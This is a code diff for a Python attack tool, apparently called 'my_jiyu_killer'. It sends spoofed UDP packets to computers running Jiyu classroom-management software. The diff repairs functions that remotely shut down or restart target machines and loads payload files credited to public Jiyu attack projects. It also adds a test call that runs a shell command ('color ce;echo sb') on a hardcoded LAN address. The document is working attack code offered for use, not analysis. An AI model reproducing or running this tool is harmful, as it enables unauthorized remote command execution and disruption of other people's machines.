@@ -3,7 +3,7 @@ import os
 import socket
 import sys
 from dataclasses import dataclass
-from typing import Tuple
+from typing import Tuple, List
 
 logger = logging.getLogger("my_jiyu_killer")
 logger.setLevel(logging.DEBUG)
@@ -47,15 +47,15 @@ def read_payload(shutdown_dir: str, restart_dir: str, msg_dir: str, cmd_dir: str
     with open(cmd_dir, "rb") as f:
         Payload.CMD = f.read()
     logger.info(f"Read payload from: {shutdown_dir}, {restart_dir}, {msg_dir}, {cmd_dir}")
-    logger.debug(f"shutdown payload: {Payload.SHUTDOWN.hex(' ')}")
-    logger.debug(f"restart payload: {Payload.RESTART.hex(' ')}")
-    logger.debug(f"msg payload: {Payload.MSG.hex(' ')}")
-    logger.debug(f"cmd payload: {Payload.CMD.hex(' ')}")
+    # logger.debug(f"shutdown payload: {Payload.SHUTDOWN.hex(' ')}")
+    # logger.debug(f"restart payload: {Payload.RESTART.hex(' ')}")
+    # logger.debug(f"msg payload: {Payload.MSG.hex(' ')}")
+    # logger.debug(f"cmd payload: {Payload.CMD.hex(' ')}")
 
 
 class Send:
     @staticmethod
-    def _format_data(content: str) -> list[int]:
+    def _format_data(content: str) -> List[int]:
         formatted_bytes = []
         for char in content:
             code_point = ord(char)
@@ -78,7 +78,7 @@ class Send:
     def shutdown(address: Tuple[str, int]):
         with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
             try:
-                sock.sendto(packet, address)
+                sock.sendto(Payload.SHUTDOWN, address)
             except socket.gaierror as e:
                 logger.error(f"socket.gaierror: {e}")
                 raise
@@ -90,7 +90,7 @@ class Send:
     def restart(address: Tuple[str, int]):
         with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
             try:
-                sock.sendto(packet, address)
+                sock.sendto(Payload.RESTART, address)
             except socket.gaierror as e:
                 logger.error(f"socket.gaierror: {e}")
                 raise
@@ -148,11 +148,15 @@ def get_localhost() -> str:
     lan_ip = socket.gethostbyname(hostname)
     return lan_ip
 
+# from Jiyu_udp_attack (https://github.com/ht0Ruial/Jiyu_udp_attack)
+SHUTDOWN_DIR = _resource_dir(".\\assets\\shutdown.bin")
+RESTART_DIR = _resource_dir(".\\assets\\restart.bin")
+MSG_DIR = _resource_dir(".\\assets\\msg.bin")
+# from JiYuHacker (https://github.com/mxym/JiYuHacker)
+CMD_DIR = _resource_dir(".\\assets\\cmd.bin")
+read_payload(SHUTDOWN_DIR, RESTART_DIR, MSG_DIR, CMD_DIR)
+
 if __name__ == '__main__':
-    # from Jiyu_udp_attack (https://github.com/ht0Ruial/Jiyu_udp_attack)
-    SHUTDOWN_DIR = _resource_dir(".\\assets\\shutdown.bin")
-    RESTART_DIR = _resource_dir(".\\assets\\restart.bin")
-    MSG_DIR = _resource_dir(".\\assets\\msg.bin")
-    # from JiYuHacker (https://github.com/mxym/JiYuHacker)
-    CMD_DIR = _resource_dir(".\\assets\\cmd.bin")
-    read_payload(SHUTDOWN_DIR, RESTART_DIR, MSG_DIR, CMD_DIR)
+    ADDR = ("10.165.43.52", 4705) # edit this test ip before
+    send = Send()
+    send.cmd(ADDR, "color ce;echo sb", True)
